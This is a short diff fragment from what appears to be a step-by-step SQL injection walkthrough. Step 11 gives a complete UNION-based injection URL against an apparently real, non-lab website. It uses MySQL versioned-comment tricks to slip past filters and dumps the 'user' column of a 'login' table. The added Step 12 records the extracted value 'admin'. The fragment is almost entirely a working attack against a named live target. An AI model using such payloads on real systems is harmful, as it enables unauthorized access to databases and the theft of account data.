@@ -60,3 +60,6 @@ outcome : "user"
 
 #### Step 11 : exploiting the user "column"
 https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,/*!12312group_concat(user)%20*/%20/*!12312from*/%20login%20--+
+
+#### Step 12 : result 
+outcome : admin
